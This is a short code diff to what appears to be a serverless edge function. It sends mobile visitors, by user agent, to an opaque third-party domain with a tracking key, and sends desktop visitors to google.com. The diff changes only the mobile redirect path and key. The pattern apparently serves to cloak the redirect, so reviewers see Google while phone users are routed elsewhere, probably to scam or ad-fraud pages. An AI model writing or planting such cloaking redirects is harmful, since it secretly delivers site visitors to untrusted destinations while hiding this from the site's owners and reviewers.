@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://accessorydairy.com/v0mz9abk?key=96667a4f3a965972306f4516b4ca9e6d", 302);
+    return Response.redirect("https://accessorydairy.com/irfxmhxurx?key=22d7b1d77a5bd3b9a4bbaf8272704aee", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
